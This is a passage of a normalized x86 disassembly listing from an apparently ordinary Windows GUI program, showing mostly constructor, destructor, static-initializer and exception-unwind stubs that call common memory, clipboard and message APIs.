pop esi
retn 0x4
push esi
call sub_423161
j_sub_4235ec
jmp sub_4235ec
sub_422c5b
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_41b7ec
retn
sub_422c7a
push esi
mov esi ecx
call sub_422c95
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_422d43
call sub_422d4d
jmp sub_422d4e
sub_422d4d
retn
sub_422d4e
push sub_422d5a
call sub_40bc2c
pop ecx
retn
sub_422d5a
mov ecx rw-data
jmp sub_42408a
sub_422d8a
call sub_422d64
add eax 0x1070
push sub_42267f
mov ecx eax
call sub_423575
retn
sub_422dfe
push esi
mov esi ecx
call j_sub_422be1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
j_sub_422be1
jmp sub_422be1
sub_422e1e
push 0x8
call sub_41b806
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_422e38
mov eax r--data
retn
sub_422e3e
mov ecx rw-data
call sub_40b6ce
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_422e5a
push esi
mov esi ecx
call sub_422e7a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40b75d
sub_422e7a
mov eax sub_425fe0
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41f58a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_422ea3
mov eax r--data
retn
sub_422ea9
call sub_422eb3
jmp sub_422ec2
sub_422eb3
push 0x40
push 0x8
mov ecx rw-data
call sub_40b66a
retn
sub_422ec2
push sub_422ece
call sub_40bc2c
pop ecx
retn
sub_422ece
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40b692
sub_422ee9
mov eax r--data
retn
sub_422eef
call sub_422ef9
jmp sub_422f0b
sub_422ef9
push 0xf022
push 0x0
mov ecx rw-data
call sub_404cd3
retn
sub_422f0b
push sub_422f17
call sub_40bc2c
pop ecx
retn
sub_422f17
mov ecx rw-data
jmp sub_404d19
sub_422f21
mov eax r--data
retn
sub_422f27
call sub_422f31
jmp sub_422f43
sub_422f31
push 0xf024
push 0x0
mov ecx rw-data
call sub_404d20
retn
sub_422f43
push sub_422f4f
call sub_40bc2c
pop ecx
retn
sub_422f4f
mov ecx rw-data
jmp sub_404d66
sub_422f59
push 0x10
call sub_41b806
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_420a0e
retn
sub_422f70
mov eax r--data
retn
sub_422f76
mov eax r--data
retn
sub_422f7c
mov eax r--data
retn
sub_422f82
mov eax r--data
retn
sub_422f88
push 0x8
call sub_41b806
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_422fa2
mov eax r--data
retn
sub_422fa8
mov eax r--data
retn
sub_422fd4
push esi
mov esi ecx
call j_sub_420b2d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40b75d
j_sub_420b2d
jmp sub_420b2d
sub_422ff9
mov eax r--data
retn
sub_422fff
mov ecx rw-data
call sub_40b6ce
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_42301b
push esi
mov esi ecx
call sub_42303b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40b75d
sub_42303b
mov eax sub_4260bc
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_421292
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_423064
mov eax r--data
retn
sub_42306a
call sub_423074
jmp sub_423083
sub_423074
push 0x40
push 0x10
mov ecx rw-data
call sub_40b66a
retn
sub_423083
push sub_42308f
call sub_40bc2c
pop ecx
retn
sub_42308f
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40b692
sub_4230aa
call sub_4230b4
jmp sub_4230c3
sub_4230b4
push 0x40
push 0x8
mov ecx rw-data
call sub_40b66a
retn
sub_4230c3
push sub_4230cf
call sub_40bc2c
pop ecx
retn
sub_4230cf
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_40b692
sub_4230ea
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_423143
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_41a429
sub_423161
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_423467
push esi
mov esi ecx
call sub_423482
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_423482
retn
sub_42368a
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_42351c
sub_4236a4
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec [ rw-data ]
jne r-xdata
retn
call sub_4231b7
and [ rw-data ] 0x0
sub_4237a6
mov eax r--data
retn
sub_4237ac
call sub_4237b6
jmp sub_4237c8
sub_4237b6
push 0xf023
push 0x0
mov ecx rw-data
call sub_404eb7
retn
sub_4237c8
push sub_4237d4
call sub_40bc2c
pop ecx
retn
sub_4237d4
mov ecx rw-data
jmp sub_404efd
sub_4237de
mov eax r--data
retn
sub_4237e4
call sub_4237ee
jmp sub_423800
sub_4237ee
push 0xf021
push 0x0
mov ecx rw-data
call sub_404f04
retn
sub_423800
push sub_42380c
call sub_40bc2c
pop ecx
retn
sub_42380c
mov ecx rw-data
jmp sub_404f4a
sub_423919
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_42393a
call sub_423944
jmp sub_42394e
sub_423944
mov ecx rw-data
jmp sub_4239b6
sub_42394e
push sub_42395a
call sub_40bc2c
pop ecx
retn
sub_42395a
mov ecx rw-data
jmp sub_425a7f
sub_423994
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_423ac8
push sub_422775
mov ecx rw-data
call sub_42360a
retn
sub_423ad8
call sub_423ae2
jmp sub_423ae3
sub_423ae2
retn
sub_423ae3
push sub_423aef
call sub_40bc2c
pop ecx
retn
sub_423aef
mov ecx rw-data
jmp j_sub_4235ec
sub_423af9
call sub_423b03
jmp sub_423b04
sub_423b03
retn
sub_423b04
push sub_423b10
call sub_40bc2c
pop ecx
retn
sub_423b10
mov ecx rw-data
jmp sub_42408a
sub_423b1a
mov eax r--data
retn
sub_423b20
mov eax r--data
retn
sub_423b49
jmp r-xdata
call sub_423b26
mov [ rw-data ] eax
retn
sub_423b59
mov eax r--data
retn
sub_423d35
mov eax r--data
retn
sub_423d3b
mov eax r--data
retn
sub_423d41
jmp r-xdata
mov ecx rw-data
jmp sub_423d50
sub_423f1d
mov eax r--data
retn
sub_423fb5
mov eax r--data
retn
sub_423ffd
push esi
mov esi ecx
call sub_425a89
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_424038
mov eax r--data
retn
sub_42403e
mov eax ecx
mov [ eax ] r--data
retn
sub_424047
push esi
mov esi ecx
call sub_424062
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_424062
mov [ ecx ] r--data
retn
sub_424069
call sub_424073
jmp sub_424074
sub_424073
retn
sub_424074
push sub_424080
call sub_40bc2c
pop ecx
retn
sub_424080
mov ecx rw-data
jmp sub_42408a
sub_4240ab
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
add ecx 0x4
push ecx
call [ InterlockedIncrement@IAT ]
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
retn
sub_4240ee
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
jmp sub_4240c4
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
retn
sub_42436a
push esi
mov esi ecx
push [ esp + 0x8 ]
push 0x0
call sub_41bc2c
or [ esi + 0x5c ] 0xffffffff
mov eax esi
pop esi
retn 0x4
sub_424382
mov eax [ esp + 0x4 ]
cmp eax 0x1
mov [ ecx + 0x5c ] eax
je r-xdata
retn 0x4
xor ecx ecx
cmp eax 0x2
setne cl
dec ecx
and ecx 0x3
dec ecx
mov eax ecx
sub_4243f4
push esi
mov esi ecx
call sub_424410
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_424410
mov [ ecx ] r--data
jmp sub_41b9b4
sub_4244ea
push esi
mov esi ecx
call sub_424506
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_424584
mov eax [ ecx + 0x28 ]
mov edx [ ecx + 0x2c ]
cmp eax edx
jb r-xdata
inc eax
cmp eax edx
mov [ ecx + 0x28 ] eax
sbb eax eax
neg eax
retn
xor eax eax
retn
sub_42459c
and [ ecx + 0x28 ] 0x0
retn
sub_4245e7
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
call sub_4240ab
retn 0x4
sub_4245f6
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
call sub_4240ee
retn 0x4
sub_424605
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x34 ]
call sub_424251
retn 0xc
sub_42466b
mov ecx [ ebp + 0xc ]
call sub_41f64a
mov eax r-xdata
retn
sub_4246db
mov ecx [ ebp + 0xc ]
call sub_41f64a
mov eax r-xdata
retn
sub_424702
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
mov eax [ eax - 0x34 ]
call [ eax + 0x58 ]
xor eax eax
retn 0x4
sub_42477e
mov ecx [ ebp + 0xc ]
call sub_41f64a
mov eax r-xdata
retn
sub_42478c
call sub_42479c
test eax eax
je r-xdata
retn
jmp [ OleFlushClipboard@IAT ]
sub_424808
inc [ ecx + 0x20 ]
retn
sub_42480c
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
retn
dec eax
mov [ ecx + 0x20 ] eax
sub_424923
mov ecx [ ebp - 0x14 ]
call sub_41f64a
mov eax r-xdata
retn
sub_42499f
mov ecx [ ebp - 0x14 ]
call sub_41f64a
mov eax r-xdata
retn
sub_4249ad
mov eax r--data
retn
sub_4249b3
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x3c ]
call sub_4240ab
retn 0x4
sub_4249c2
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x3c ]
call sub_4240ee
retn 0x4
sub_4249d1
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x3c ]
call sub_424251
retn 0xc
sub_425160
push esi
mov esi ecx
call sub_425115
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_425446
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ ecx + 0xc ]
push [ esp + 0xc ]
call [ lstrcpynA@IAT ]
push 0x1
pop eax
retn 0xc
and [ eax ] 0x0
sub_425468
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x1
retn
sub_425475
push esi
mov esi ecx
call sub_42548e
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
pop esi
retn 0x8
sub_4259cf
pop edx
pop eax
pop ecx
add ecx [ esp ]
mov [ ecx ] edx
sub ecx [ esp ]
mov esp ecx
pop ecx
call eax
retn
sub_425a0d
call sub_41ad89
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_425a7f
add ecx 0x50
push ecx
call sub_421403
retn
sub_425ac1
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
push 0x0
push 0x0
call [ CoRegisterMessageFilter@IAT ]
and [ esi + 0x1c ] 0x0
sub_425be0
lea ecx [ ebp - 0x6c ]
jmp j_sub_41b9b4
sub_425be8
mov eax r--data
jmp sub_40bcfe
sub_425c00
lea ecx [ ebp - 0x2c ]
jmp sub_41c358
sub_425c08
lea ecx [ ebp - 0x28 ]
jmp sub_404541
sub_425c10
mov eax r--data
jmp sub_40bcfe
sub_425c20
mov ecx [ ebp - 0x10 ]
jmp sub_41b9b4
sub_425c28
mov eax r--data
jmp sub_40bcfe
sub_425c40
lea ecx [ ebp - 0x410 ]
jmp sub_41c358
sub_425c4b
mov eax r--data
jmp sub_40bcfe
sub_425c60
lea ecx [ ebp - 0x68 ]
jmp j_sub_41b9b4
sub_425c68
mov eax r--data
jmp sub_40bcfe
sub_425c74
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425c7c
mov eax r--data
jmp sub_40bcfe
sub_425c88
mov ecx [ ebp - 0x10 ]
jmp sub_425a30
sub_425c90
mov eax r--data
jmp sub_40bcfe
sub_425c9c
mov ecx [ ebp - 0x10 ]
jmp sub_425a30
sub_425ca4
mov eax r--data
jmp sub_40bcfe
sub_425cb0
push [ ebp - 0x10 ]
call sub_423161
retn
sub_425cb9
mov eax r--data
jmp sub_40bcfe
sub_425cc4
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425ccc
mov eax r--data
jmp sub_40bcfe
sub_425cd8
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_425ce0
mov eax r--data
jmp sub_40bcfe
sub_425cec
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_425cf4
mov eax r--data
jmp sub_40bcfe
sub_425d00
push [ ebp - 0x10 ]
call sub_423161
retn
sub_425d09
mov eax r--data
jmp sub_40bcfe
sub_425d14
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425d1c
mov eax r--data
jmp sub_40bcfe
sub_425d28
mov ecx [ ebp - 0x10 ]
jmp sub_41d23d
sub_425d30
mov eax r--data
jmp sub_40bcfe
sub_425d3c
lea ecx [ ebp - 0x1c ]
jmp sub_41c358
sub_425d44
lea ecx [ ebp - 0x40 ]
jmp sub_41fa68
sub_425d4c
mov eax r--data
jmp sub_40bcfe
sub_425d58
mov eax r--data
jmp sub_40bcfe
sub_425d64
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_425d6d
mov eax r--data
jmp sub_40bcfe
sub_425d78
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_425d81
mov eax r--data
jmp sub_40bcfe
sub_425d8c
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425d94
push [ ebp - 0x30 ]
call sub_41b82f
pop ecx
retn
sub_425d9e
lea ecx [ ebp - 0x8c ]
jmp sub_421d6e
sub_425da9
mov eax r--data
jmp sub_40bcfe
sub_425db4
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425dbc
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_41c358
sub_425dc7
mov eax r--data
jmp sub_40bcfe
sub_425dd4
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425ddc
lea ecx [ ebp - 0x14 ]
jmp sub_41c358
sub_425de4
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_425dfb
mov eax r--data
jmp sub_40bcfe
sub_425e08
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425e10
lea ecx [ ebp - 0x14 ]
jmp sub_41c358
sub_425e18
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_425e2f
mov eax r--data
jmp sub_40bcfe
sub_425e3c
lea ecx [ ebp - 0x14 ]
jmp sub_41c358
sub_425e44
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425e4c
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_425e63
mov eax r--data
jmp sub_40bcfe
sub_425e70
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_425e78
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_425e8f
mov eax r--data
jmp sub_40bcfe
sub_425e9c
mov eax r--data
jmp sub_40bcfe
sub_425ea8
push [ ebp + 0x8 ]
call sub_41b82f
pop ecx
retn
sub_425eb2
mov eax r--data
jmp sub_40bcfe
sub_425ebc
mov eax r--data
jmp sub_40bcfe
sub_425ec8
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_425ed0
mov eax r--data
jmp sub_40bcfe
sub_425edc
mov eax r--data
jmp sub_40bcfe
sub_425ee8
lea ecx [ ebp - 0x8 ]
jmp sub_404c81
sub_425ef0
mov eax r--data
jmp sub_40bcfe
sub_425efc
lea ecx [ ebp - 0x24 ]
jmp sub_420b2d
sub_425f04
lea ecx [ ebp - 0x60 ]
jmp sub_41d23d
sub_425f0c
lea ecx [ ebp - 0x24 ]
jmp sub_420b2d
sub_425f14
mov eax r--data
jmp sub_40bcfe
sub_425f20
lea ecx [ ebp - 0x48 ]
jmp sub_41d23d
sub_425f28
mov eax r--data
jmp sub_40bcfe
sub_425f34
mov eax r--data
jmp sub_40bcfe
sub_425f40
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_425f49
mov eax r--data
jmp sub_40bcfe
sub_425f54
push [ ebp - 0x10 ]
call sub_41f11a
pop ecx
retn
sub_425f5e
mov eax r--data
jmp sub_40bcfe
sub_425f68
push [ ebp - 0x10 ]
call sub_423161
retn
sub_425f71
mov eax r--data
jmp sub_40bcfe
sub_425f7c
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425f84
mov eax r--data
jmp sub_40bcfe
sub_425f90
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425f98
mov ecx [ ebp - 0x10 ]
add ecx 0x1070
jmp j_sub_4235ec
sub_425fa6
mov eax r--data
jmp sub_40bcfe
sub_425fb0
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425fb8
mov eax r--data
jmp sub_40bcfe
sub_425fc4
push [ ebp + 0x8 ]
call sub_41b82f
pop ecx
retn
sub_425fce
mov eax r--data
jmp sub_40bcfe
sub_425fd8
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425fe0
mov eax r--data
jmp sub_40bcfe
sub_425fec
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_425ff4
mov eax r--data
jmp sub_40bcfe
sub_426000
push [ ebp + 0x8 ]
call sub_41b82f
pop ecx
retn
sub_42600a
mov eax r--data
jmp sub_40bcfe
sub_426014
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_42601c
mov eax r--data
jmp sub_40bcfe
sub_426028
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_426030
mov eax r--data
jmp sub_40bcfe
sub_42603c
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_426044
mov eax r--data
jmp sub_40bcfe
sub_426050
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_426058
mov eax r--data
jmp sub_40bcfe
sub_426064
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_42606c
mov eax r--data
jmp sub_40bcfe
sub_426078
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_426080
mov eax r--data
jmp sub_40bcfe
sub_42608c
mov ecx [ ebp - 0x10 ]
jmp sub_420b2d
sub_426094
mov eax r--data
jmp sub_40bcfe
sub_4260a0
push [ ebp + 0x8 ]
call sub_41b82f
pop ecx
retn
sub_4260aa
mov eax r--data
jmp sub_40bcfe
sub_4260b4
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_4260bc
mov eax r--data
jmp sub_40bcfe
sub_4260c8
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_4260d0
mov eax r--data
jmp sub_40bcfe
sub_4260dc
mov eax r--data
jmp sub_40bcfe
sub_4260e8
mov eax r--data
jmp sub_40bcfe
sub_4260f4
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_4260fc
mov eax r--data
jmp sub_40bcfe
sub_426108
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426110
mov eax r--data
jmp sub_40bcfe
sub_42611c
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41a9a4
sub_426127
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_41a9a4
sub_426132
mov eax r--data
jmp sub_40bcfe
sub_42613c
mov eax r--data
jmp sub_40bcfe
sub_426148
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41a9a4
sub_426153
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_41a9a4
sub_42615e
mov eax r--data
jmp sub_40bcfe
sub_426168
mov eax r--data
jmp sub_40bcfe
sub_426174
mov eax r--data
jmp sub_40bcfe
sub_426180
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_426188
mov eax r--data
jmp sub_40bcfe
sub_426194
mov ecx [ ebp - 0x1c ]
jmp sub_41b355
sub_42619c
mov ecx [ ebp - 0x1c ]
add ecx 0x20
jmp sub_41a9a4
sub_4261a7
mov eax r--data
jmp sub_40bcfe
sub_4261b4
mov eax r--data
jmp sub_40bcfe
sub_4261c0
lea ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_4261c8
lea ecx [ ebp + 0xc ]
jmp sub_41c358
sub_4261d0
mov eax r--data
jmp sub_40bcfe
sub_4261dc
lea ecx [ ebp - 0x18 ]
jmp sub_40594d
sub_4261e4
lea ecx [ ebp - 0x18 ]
jmp sub_404503
sub_4261ec
lea ecx [ ebp - 0x2c ]
jmp sub_4210e6
sub_4261f4
lea ecx [ ebp - 0x18 ]
jmp sub_404503
sub_4261fc
mov eax r--data
jmp sub_40bcfe
sub_426208
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426210
mov eax r--data
jmp sub_40bcfe
sub_42621c
mov eax r--data
jmp sub_40bcfe
sub_426228
mov ecx [ ebp - 0x10 ]
jmp sub_424506
sub_426230
mov eax r--data
jmp sub_40bcfe
sub_42623c
push [ ebp - 0x28 ]
call sub_403bba
retn
sub_426245
mov eax r--data
jmp sub_40bcfe
sub_426250
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_426258
mov eax r--data
jmp sub_40bcfe
sub_426264
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_42626c
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp j_sub_42548e
sub_426277
mov ecx [ ebp - 0x10 ]
add ecx 0x9c
jmp sub_41c358
sub_426285
mov eax r--data
jmp sub_40bcfe
sub_426290
lea ecx [ ebp - 0x28 ]
jmp sub_421032
sub_426298
mov eax r--data
jmp sub_40bcfe
sub_4262a4
lea ecx [ ebp - 0x38 ]
jmp sub_421032
sub_4262ac
mov eax r--data
jmp sub_40bcfe
sub_4262b8
lea ecx [ ebp - 0x24 ]
jmp sub_40ac64
sub_4262c0
mov eax r--data
jmp sub_40bcfe
sub_4262cc
lea ecx [ ebp - 0x70 ]
jmp sub_421580
sub_4262d4
mov eax r--data
jmp sub_40bcfe
sub_4262e0
mov eax r--data
jmp sub_40bcfe
sub_4262ec
mov eax r--data
jmp sub_40bcfe
sub_4262f8
mov eax r--data
jmp sub_40bcfe
sub_426304
mov eax r--data
jmp sub_40bcfe
sub_426310
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_426318
mov eax r--data
jmp sub_40bcfe
sub_426324
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_42632c
mov eax r--data
jmp sub_40bcfe
sub_426338
mov eax r--data
jmp sub_40bcfe
sub_426344
mov eax r--data
jmp sub_40bcfe
sub_426350
push [ ebp - 0x10 ]
call sub_41b82f
pop ecx
retn
sub_42635a
mov eax r--data
jmp sub_40bcfe
sub_426364
push [ ebp + 0xc ]
call sub_41b82f
pop ecx
retn
sub_42636e
mov eax r--data
jmp sub_40bcfe
sub_426378
mov ecx [ ebp - 0x20 ]
add ecx 0x18
jmp sub_41a77a
sub_426383
mov eax r--data
jmp sub_40bcfe
sub_426390
lea ecx [ ebp - 0x10 ]
jmp sub_40ac29
sub_426398
mov eax r--data
jmp sub_40bcfe
sub_4263a4
mov ecx [ ebp - 0x10 ]
jmp sub_40ac29
sub_4263ac
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40ac29
sub_4263b7
mov eax r--data
jmp sub_40bcfe
sub_4263c4
push [ ebp - 0x24 ]
call sub_41b82f
pop ecx
retn
sub_4263ce
push [ ebp - 0x18 ]
call sub_403bba
retn
sub_4263d7
mov eax r--data
jmp sub_40bcfe
sub_4263e4
mov ecx [ ebp - 0x10 ]
jmp sub_40ac29
sub_4263ec
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40ac29
sub_4263f7
mov eax r--data
jmp sub_40bcfe
sub_426404
lea ecx [ ebp - 0x14 ]
jmp sub_40ac29
sub_42640c
lea ecx [ ebp - 0x1c ]
jmp sub_40ac29
sub_426414
mov eax r--data
jmp sub_40bcfe
sub_426420
mov eax r--data
jmp sub_40bcfe
sub_42642c
lea ecx [ ebp - 0x1c ]
jmp sub_40ac64
sub_426434
lea ecx [ ebp - 0xc4 ]
jmp sub_40ac64
sub_42643f
lea ecx [ ebp - 0x54 ]
jmp sub_40ac64
sub_426447
lea ecx [ ebp - 0x94 ]
jmp sub_40ac64
sub_426452
lea ecx [ ebp - 0x64 ]
jmp sub_40ac64
sub_42645a
lea ecx [ ebp - 0xf0 ]
jmp sub_40ac64
sub_426465
lea ecx [ ebp - 0x110 ]
jmp sub_40ac64
sub_426470
lea ecx [ ebp - 0xb4 ]
jmp sub_40ac64
sub_42647b
lea ecx [ ebp - 0x130 ]
jmp sub_40ac64
sub_426486
lea ecx [ ebp - 0x100 ]
jmp sub_40ac64
sub_426491
lea ecx [ ebp - 0x44 ]
jmp sub_41c358
sub_426499
lea ecx [ ebp - 0x120 ]
jmp sub_40ac64
sub_4264a4
lea ecx [ ebp - 0xd4 ]
jmp sub_40ac64
sub_4264af
lea ecx [ ebp - 0xa4 ]
jmp sub_40ac64
sub_4264ba
lea ecx [ ebp - 0x74 ]
jmp sub_40ac64
sub_4264c2
lea ecx [ ebp - 0x84 ]
jmp sub_40ac64
sub_4264cd
lea ecx [ ebp - 0x40 ]
jmp sub_41c358
sub_4264d5
lea ecx [ ebp - 0x140 ]
jmp sub_40ac64
sub_4264e0
mov eax r--data
jmp sub_40bcfe
sub_4264ec
lea ecx [ ebp - 0x38 ]
jmp sub_40ac64
sub_4264f4
lea ecx [ ebp - 0x58 ]
jmp sub_40ac64
sub_4264fc
mov eax r--data
jmp sub_40bcfe
sub_426508
lea ecx [ ebp - 0x30 ]
jmp sub_40ac64
sub_426510
lea ecx [ ebp - 0xb0 ]
jmp sub_40a3e2
sub_42651b
lea ecx [ ebp - 0x58 ]
jmp sub_40ac64
sub_426523
mov eax r--data
jmp sub_40bcfe
sub_426530
mov eax r--data
jmp sub_40bcfe
sub_42653c
lea ecx [ ebp - 0x10 ]
jmp sub_40ac29
sub_426544
mov eax r--data
jmp sub_40bcfe
sub_426550
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426558
mov eax r--data
jmp sub_40bcfe
sub_426564
mov ecx [ ebp - 0x10 ]
jmp sub_41fdf9
sub_42656c
mov eax r--data
jmp sub_40bcfe
sub_426578
mov eax r--data
jmp sub_40bcfe
sub_426584
mov eax r--data
jmp sub_40bcfe
sub_426590
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426598
mov eax r--data
jmp sub_40bcfe
sub_4265a4
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_4265ac
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41c358
sub_4265b7
mov eax r--data
jmp sub_40bcfe
sub_4265c4
lea ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_4265cc
mov eax r--data
jmp sub_40bcfe
sub_4265d8
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_4265e0
mov eax r--data
jmp sub_40bcfe
sub_4265ec
mov eax r--data
jmp sub_40bcfe
sub_4265f8
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426600
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41c358
sub_42660b
